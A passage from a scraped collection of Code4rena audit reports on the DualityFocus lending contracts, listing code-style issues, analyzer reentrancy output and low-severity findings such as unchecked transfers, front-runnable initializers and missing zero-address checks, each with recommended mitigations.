[90](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/MasterPriceOracle.sol#L90))\n```solidity\n    event NewAdmin(address oldAdmin, address newAdmin);\n```\n2. File: contracts/compound_rari_fork/Comptroller.sol (line [20](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L20))\n```solidity\n    event MarketListed(CToken cToken);\n```\n3. File: contracts/compound_rari_fork/Comptroller.sol (line [23](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L23))\n```solidity\n    event MarketUnlisted(CToken cToken);\n```\n4. File: contracts/compound_rari_fork/Comptroller.sol (line [26](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L26))\n```solidity\n    event MarketEntered(CToken cToken, address account);\n```\n5. File: contracts/compound_rari_fork/Comptroller.sol (line [29](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L29))\n```solidity\n    event MarketExited(CToken cToken, address account);\n```\n6. File: contracts/compound_rari_fork/Comptroller.sol (line [32](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L32))\n```solidity\n    event NewCloseFactor(uint256 oldCloseFactorMantissa, uint256 newCloseFactorMantissa);\n```\n7. File: contracts/compound_rari_fork/Comptroller.sol (line [35](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L35))\n```solidity\n    event NewCollateralFactor(CToken cToken, uint256 oldCollateralFactorMantissa, uint256 newCollateralFactorMantissa);\n```\n8. File: contracts/compound_rari_fork/Comptroller.sol (line [38](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L38))\n```solidity\n    event NewLiquidationIncentive(uint256 oldLiquidationIncentiveMantissa, uint256 newLiquidationIncentiveMantissa);\n```\n9. File: contracts/compound_rari_fork/Comptroller.sol (line [41](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L41))\n```solidity\n    event NewPriceOracle(PriceOracle oldPriceOracle, PriceOracle newPriceOracle);\n```\n10. File: contracts/compound_rari_fork/Comptroller.sol (line [44](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L44))\n```solidity\n    event NewTickOracle(TickOracle oldTickOracle, TickOracle newTickOracle);\n```\n11. File: contracts/compound_rari_fork/Comptroller.sol (line [47](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L47))\n```solidity\n    event NewUniV3LpVault(IUniV3LpVault oldVault, IUniV3LpVault newVault);\n```\n12. File: contracts/compound_rari_fork/Comptroller.sol (line [50](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L50))\n```solidity\n    event NewPauseGuardian(address oldPauseGuardian, address newPauseGuardian);\n```\n13. File: contracts/compound_rari_fork/Comptroller.sol (line [53](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L53))\n```solidity\n    event ActionPaused(string action, bool pauseState);\n```\n\n\n### Not using the named return variables when a function returns, is confusing\n\n1. File: contracts/libs/UniswapTwapLibrary.sol (line [94](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/libs/UniswapTwapLibrary.sol#L94))\n```solidity\n        return OracleLibrary.consultAtHistoricTime(_pool, requestPeriod, 0);\n```\n2. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (line [155](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L155))\n```solidity\n        return LpBreakdownLibrary._getTokenBreakdown(tokenId, true, nfpManager, factory, address(this));\n```\n3. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (line [155](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L155))\n```solidity\n        return LpBreakdownLibrary._getTokenBreakdown(tokenId, true, nfpManager, factory, address(this));\n```\n4. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (line [155](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L155))\n```solidity\n        return LpBreakdownLibrary._getTokenBreakdown(tokenId, true, nfpManager, factory, address(this));\n```\n5. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (line [155](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L155))\n```solidity\n        return LpBreakdownLibrary._getTokenBreakdown(tokenId, true, nfpManager, factory, address(this));\n```\n6. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (line [155](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L155))\n```solidity\n        return LpBreakdownLibrary._getTokenBreakdown(tokenId, true, nfpManager, factory, address(this));\n```\n7. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (line [155](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L155))\n```solidity\n        return LpBreakdownLibrary._getTokenBreakdown(tokenId, true, nfpManager, factory, address(this));\n```\n8. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (line [155](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L155))\n```solidity\n        return LpBreakdownLibrary._getTokenBreakdown(tokenId, true, nfpManager, factory, address(this));\n```\n9. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (line [184](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L184))\n```solidity\n        return LpBreakdownLibrary._getTokenBreakdown(tokenId, false, nfpManager, factory, address(this));\n```\n10. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (line [184](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L184))\n```solidity\n        return LpBreakdownLibrary._getTokenBreakdown(tokenId, false, nfpManager, factory, address(this));\n```\n11. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (line [184](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L184))\n```solidity\n        return LpBreakdownLibrary._getTokenBreakdown(tokenId, false, nfpManager, factory, address(this));\n```\n12. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (line [184](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L184))\n```solidity\n        return LpBreakdownLibrary._getTokenBreakdown(tokenId, false, nfpManager, factory, address(this));\n```\n13. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (line [184](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L184))\n```solidity\n        return LpBreakdownLibrary._getTokenBreakdown(tokenId, false, nfpManager, factory, address(this));\n```\n14. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (line [184](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L184))\n```solidity\n        return LpBreakdownLibrary._getTokenBreakdown(tokenId, false, nfpManager, factory, address(this));\n```\n15. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (line [184](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L184))\n```solidity\n        return LpBreakdownLibrary._getTokenBreakdown(tokenId, false, nfpManager, factory, address(this));\n```\n\n\n### Use a more recent version of solidity\nUse a solidity version of at least 0.8.0 to get overflow protection without needing `SafeMath`\nUse a solidity version of at least 0.8.4 to get `bytes.concat()` instead of `abi.encodePacked(<bytes>,<bytes>)`\nUse a solidity version of at least 0.8.12 to get `string.concat()` instead of `abi.encodePacked(<str>,<str>)`\n\n1. File: contracts/libs/LpBreakdownLibrary.sol (line [1](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/libs/LpBreakdownLibrary.sol#L1))\n```solidity\npragma solidity ^0.7.6;\n```\n2. File: contracts/libs/TicksLibrary.sol (line [2](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/libs/TicksLibrary.sol#L2))\n```solidity\npragma solidity ^0.7.6;\n```\n3. File: contracts/libs/UniswapTwapLibrary.sol (line [3](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/libs/UniswapTwapLibrary.sol#L3))\n```solidity\npragma solidity ^0.7.6;\n```\n4. File: contracts/libs/LiquidityLibrary.sol (line [2](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/libs/LiquidityLibrary.sol#L2))\n```solidity\npragma solidity ^0.7.6;\n```\n5. File: contracts/vault_and_oracles/UniV3LpVault.sol (line [1](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L1))\n```solidity\npragma solidity ^0.7.6;\n```\n\n\n\n### Don't compare boolean expressions to boolean literals\n`if (<x> == true)` => `if (<x>)`, `if (<x> == false)` => `if (!<x>)`\n\n1. File: contracts/vault_and_oracles/UniV3LpVault.sol (line [838](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L838))\n```solidity\n        require(msg.sender == comptroller.admin() || state == true, \"only admin can unpause\");\n```\n2. File: contracts/vault_and_oracles/UniV3LpVault.sol (line [854](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L854))\n```solidity\n        require(msg.sender == comptroller.admin() || state == true, \"only admin can unpause\");\n```\n3. File: contracts/compound_rari_fork/Comptroller.sol (line [142](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L142))\n```solidity\n        if (marketToJoin.accountMembership[borrower] == true) {\n```\n4. File: contracts/compound_rari_fork/Comptroller.sol (line [1410](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1410))\n```solidity\n        require(msg.sender == admin || state == true, \"only admin can unpause\");\n```\n5. File: contracts/compound_rari_fork/Comptroller.sol (line [1420](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1420))\n```solidity\n        require(msg.sender == admin || state == true, \"only admin can unpause\");\n```\n6. File: contracts/compound_rari_fork/Comptroller.sol (line [1429](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1429))\n```solidity\n        require(msg.sender == admin || state == true, \"only admin can unpause\");\n```\n7. File: contracts/compound_rari_fork/Comptroller.sol (line [1438](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1438))\n```solidity\n        require(msg.sender == admin || state == true, \"only admin can unpause\");\n```\n8. File: contracts/compound_rari_fork/Comptroller.sol (line [1523](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1523))\n```solidity\n            borrowGuardianPaused[address(cToken)] == true &&\n```\n\n### Remove unused variables\n\n1. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (line [26](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L26))\n```solidity\n    uint128 private constant ONE = 1e18;\n```\n\n### Duplicated `require()`/`revert()` checks should be refactored to a modifier or function\nCopy-pasted code is error-prone when conditions need to be updated\n\n1. File: contracts/vault_and_oracles/UniV3LpVault.sol (line [198](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L198))\n```solidity\n        require(!peripheryGuardianPaused, \"periphery functionality is paused\");\n```\n2. File: contracts/vault_and_oracles/UniV3LpVault.sol (lines [850-853](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L850-L853))\n```solidity\n        require(\n            msg.sender == comptroller.pauseGuardian() || msg.sender == comptroller.admin(),\n            \"only pause guardian and admin can pause\"\n        );\n```\n3. File: contracts/vault_and_oracles/UniV3LpVault.sol (line [854](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L854))\n```solidity\n        require(msg.sender == comptroller.admin() || state == true, \"only admin can unpause\");\n```\n4. File: contracts/vault_and_oracles/MasterPriceOracle.sol (lines [62-65](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/MasterPriceOracle.sol#L62-L65))\n```solidity\n        require(\n            underlyings.length > 0 && underlyings.length == _oracles.length,\n            \"Lengths of both arrays must be equal and greater than 0.\"\n        );\n```\n5. File: contracts/vault_and_oracles/MasterPriceOracle.sol (lines [128-131](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/MasterPriceOracle.sol#L128-L131))\n```solidity\n        require(\n            address(oracles[underlying]) != address(0),\n            \"Price oracle not found for this underlying token address.\"\n        );\n```\n6. File: contracts/compound_rari_fork/CToken.sol (line [285](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CToken.sol#L285))\n```solidity\n        require(accrueInterest() == uint256(Error.NO_ERROR), \"accrue interest failed\");\n```\n7. File: contracts/compound_rari_fork/CToken.sol (lines [638-641](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CToken.sol#L638-L641))\n```solidity\n        require(\n            msg.sender == address(comptroller.uniV3LpVault()) || msg.sender == redeemer,\n            \"only the LpVault may redeem other's assets\"\n        );\n```\n8. File: contracts/compound_rari_fork/CToken.sol (line [1233](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CToken.sol#L1233))\n```solidity\n        require(amountSeizeError == uint256(Error.NO_ERROR), \"LIQUIDATE_COMPTROLLER_CALCULATE_AMOUNT_SEIZE_FAILED\");\n```\n9. File: contracts/compound_rari_fork/Comptroller.sol (line [394](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L394))\n```solidity\n            require(msg.sender == cToken, \"sender must be cToken\");\n```\n10. File: contracts/compound_rari_fork/Comptroller.sol (line [546](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L546))\n```solidity\n            require(borrowBalance >= repayAmount, \"Can not repay more than the total borrow\");\n```\n11. File: contracts/compound_rari_fork/Comptroller.sol (line [617](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L617))\n```solidity\n        require(!seizeGuardianPaused, \"seize is paused\");\n```\n12. File: contracts/compound_rari_fork/Comptroller.sol (line [1418](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1418))\n```solidity\n        require(markets[address(cToken)].isListed, \"cannot pause a market that is not listed\");\n```\n13. File: contracts/compound_rari_fork/Comptroller.sol (line [1419](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1419))\n```solidity\n        require(msg.sender == pauseGuardian || msg.sender == admin, \"only pause guardian and admin can pause\");\n```\n14. File: contracts/compound_rari_fork/Comptroller.sol (line [1420](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1420))\n```solidity\n        require(msg.sender == admin || state == true, \"only admin can unpause\");\n```\n15. File: contracts/compound_rari_fork/Comptroller.sol (line [1485](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1485))\n```solidity\n        require(pools.length > 0, \"must have at least one pool\");\n```\n\n### Non-exploitable re-entrancies\n```\nReentrancy in UniV3LpVault._beforeNonReentrant(bool) (contracts/vault_and_oracles/UniV3LpVault.sol#934-938):\n\tExternal calls:\n\t- comptroller._beforeNonReentrant() (contracts/vault_and_oracles/UniV3LpVault.sol#936)\n\tState variables written after the call(s):\n\t- _notEntered = false (contracts/vault_and_oracles/UniV3LpVault.sol#937)\n```\n```\nReentrancy in CToken.borrowFresh(address,address,uint256) (contracts/compound_rari_fork/CToken.sol#835-916):\n\tExternal calls:\n\t- allowed = comptroller.borrowAllowed(address(this),borrower,borrowAmount) (contracts/compound_rari_fork/CToken.sol#841)\n\tState variables written after the call(s):\n\t- accountBorrows[borrower].principal = vars.accountBorrowsNew (contracts/compound_rari_fork/CToken.sol#908)\n\t- accountBorrows[borrower].interestIndex = borrowIndex (contracts/compound_rari_fork/CToken.sol#909)\n\t- totalBorrows = vars.totalBorrowsNew (contracts/compound_rari_fork/CToken.sol#910)\nReentrancy in CErc20.initialize(address,ComptrollerInterface,InterestRateModel,string,string,uint256) (contracts/compound_rari_fork/CErc20.sol#20-44):\n\tExternal calls:\n\t- super.initialize(comptroller_,interestRateModel_,initialExchangeRateMantissa_,name_,symbol_,decimals_,reserveFactorMantissa_) (contracts/compound_rari_fork/CErc20.sol#31-39)\n\t\t- address(oldInterestRateModel).call(abi.encodeWithSignature(resetInterestCheckpoints())) (contracts/compound_rari_fork/CToken.sol#1624)\n\t\t- address(newInterestRateModel).call(abi.encodeWithSignature(checkpointInterest())) (contracts/compound_rari_fork/CToken.sol#1627)\n\tState variables written after the call(s):\n\t- underlying = underlying_ (contracts/compound_rari_fork/CErc20.sol#42)\n```\n```\nReentrancy in UniV3LpVault._mint(INonfungiblePositionManager.MintParams) (contracts/vault_and_oracles/UniV3LpVault.sol#696-728):\n\tExternal calls:\n\t- IERC20Detailed(params.token0).approve(address(nonfungiblePositionManager),params.amount0Desired) (contracts/vault_and_oracles/UniV3LpVault.sol#704)\n\t- IERC20Detailed(params.token1).approve(address(nonfungiblePositionManager),params.amount1Desired) (contracts/vault_and_oracles/UniV3LpVault.sol#705)\n\t- (tokenId,None,amount0,amount1) = nonfungiblePositionManager.mint(INonfungiblePositionManager.MintParams(params.token0,params.token1,params.fee,params.tickLower,params.tickUpper,params.amount0Desired,params.amount1Desired,params.amount0Min,params.amount1Min,address(this),params.deadline)) (contracts/vault_and_oracles/UniV3LpVault.sol#707-721)\n\t- IERC20Detailed(params.token0).approve(address(nonfungiblePositionManager),0) (contracts/vault_and_oracles/UniV3LpVault.sol#723)\n\t- IERC20Detailed(params.token1).approve(address(nonfungiblePositionManager),0) (contracts/vault_and_oracles/UniV3LpVault.sol#724)\n\tState variables written after the call(s):\n\t- _processNewToken(tokenId,params.recipient) (contracts/vault_and_oracles/UniV3LpVault.sol#727)\n\t\t- ownerOf[tokenId] = account (contracts/vault_and_oracles/UniV3LpVault.sol#757)\n\t- _processNewToken(tokenId,params.recipient) (contracts/vault_and_oracles/UniV3LpVault.sol#727)\n\t\t- userTokens[account].push(tokenId) (contracts/vault_and_oracles/UniV3LpVault.sol#756)\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-04-dualityfocus-findings",
      "repo": "https://github.com/code-423n4/2022-04-dualityfocus-findings",
      "url": "https://github.com/code-423n4/2022-04-dualityfocus-findings/issues/36"
    }
  },
  {
    "title": "QA Report",
    "body": "# C4-001 : Use safeTransfer/safeTransferFrom consistently instead of transfer/transferFrom\n\n\n## Impact - LOW\n\nIt is good to add a require() statement that checks the return value of token transfers or to use something like OpenZeppelin’s safeTransfer/safeTransferFrom unless one is sure the given token reverts in case of a failure. Failure to do so will cause silent failures of transfers and affect token accounting in contract.\n\nReference: This similar medium-severity finding from Consensys Diligence Audit of Fei Protocol: https://consensys.net/diligence/audits/2021/01/fei-protocol/#unchecked-return-value-for-iweth-transfer-call\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n2. transfer/transferFrom functions are used instead of safe transfer/transferFrom on the following contracts.\n\n```\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/FlashLoan.sol#L57\n\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L366\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider using safeTransfer/safeTransferFrom or require() consistently.\n\n\n# C4-002 : Incompatibility With Rebasing/Deflationary/Inflationary tokens\n\n## Impact -  LOW\n\nPrePo protocol do not appear to support rebasing/deflationary/inflationary tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/FlashLoan.sol#L57\n\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L366\n\n```\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\n- Ensure that to check previous balance/after balance  equals to amount for any rebasing/inflation/deflation\n- Add support in contracts for such tokens before accepting user-supplied tokens\n- Consider supporting deflationary / rebasing / etc tokens by extra checking the balances before/after or strictly inform your users not to use such tokens if they don't want to lose them.\n\n\n# C4-003 : Missing zero-address check in constructors and the setter functions\n\n## Impact -  LOW\n\nMissing checks for zero-addresses may lead to infunctional protocol, if the variable addresses are updated incorrectly.\n\n## Proof of Concept\n\n1. Navigate to the following all contract functions.\n\n```\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L59\n\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/MasterPriceOracle.sol#L37\n\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/FlashLoan.sol#L24\n\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L59\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider adding zero-address checks in the discussed constructors:\nrequire(newAddr != address(0));.\n\n# C4-004 : Front-runnable Initializers\n\n## Impact - LOW\n\nAll contract **initializers** were missing access controls, allowing any user to initialize the contract. By front-running the contract deployers to initialize the contract, the incorrect parameters may be supplied, leaving the contract needing to be redeployed.\n\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CErc20.sol#L20\n\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CToken.sol#L26\n```\n\n2. initialize functions does not have access control. They are vulnerable to front-running.\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\nWhile the code that can be run in contract constructors is limited, setting the owner in the contract's constructor to the `msg.sender` and adding the `onlyOwner` modifier to all **initializers** would be a sufficient level of access control.\n\n# C4-005 : Critical changes should use two-step procedure\n\n## Impact - NON CRITICAL\n\nThe critical procedures should be two step process.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L865\n\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L877\n\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L849\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nLack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.\n\n# C4-006 : # DoS With Block Gas Limit\n\n## Impact -  Non-Critical\n\nWhen smart contracts are deployed or functions inside them are called, the execution of these actions always requires a certain amount of gas, based of how much computation is needed to complete them. The Ethereum network specifies a block gas limit and the sum of all transactions included in a block can not exceed the threshold.\n\nProgramming patterns that are harmless in centralized applications can lead to Denial of Service conditions in smart contracts when the cost of executing a function exceeds the block gas limit. Modifying an array of unknown size, that increases in size over time, can lead to such a Denial of Service condition.\n\n## Proof of Concept\n\n1. Follow the functions shown below.\n\n```\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L770\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nCaution is advised when you expect to have large arrays that grow over time. Actions that require looping across the entire data structure should be avoided.\n\nIf you absolutely must loop over an array of unknown size, then you should plan for it to potentially take multiple blocks, and therefore require multiple transactions.\n\n# C4-007 : # Missing Re-entrancy Guard\n\n## Impact  - LOW\n\nThe re-entrancy guard is missing on the Eth anchor interaction. The external router interaction can cause to the re-entrancy vulnerability.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/main/contracts/compound_rari_fork/CToken.sol#L781\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/main/contracts/compound_rari_fork/CToken.sol#L905\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nFollow the check effect interaction pattern or put re-entrancy guard.\n\n# C4-008 : Missing events for only functions that change critical parameters\n\n## Impact - Non critical\n\nThe afunctions that change critical parameters should emit events. Events allow capturing the changed parameters so that off-chain tools/interfaces can register such changes with timelocks that allow users to evaluate them and consider if they would like to engage/exit based on how they perceive the changes as affecting the trustworthiness of the protocol or profitability of the implemented financial services. The alternative of directly querying on-chain contract state for such changes is not considered practical for most users/usages.\n\nMissing events and timelocks do not promote transparency and if such changes immediately affect users’ perception of fairness or trustworthiness, they could exit the protocol causing a reduction in liquidity which could negatively impact protocol TVL and reputation.\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L765\n\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L906\n```\n\nSee similar High-severity H03 finding OpenZeppelin’s Audit of Audius (https://blog.openzeppelin.com/audius-contracts-audit/#high) and Medium-severity M01 finding OpenZeppelin’s Audit of UMA Phase 4 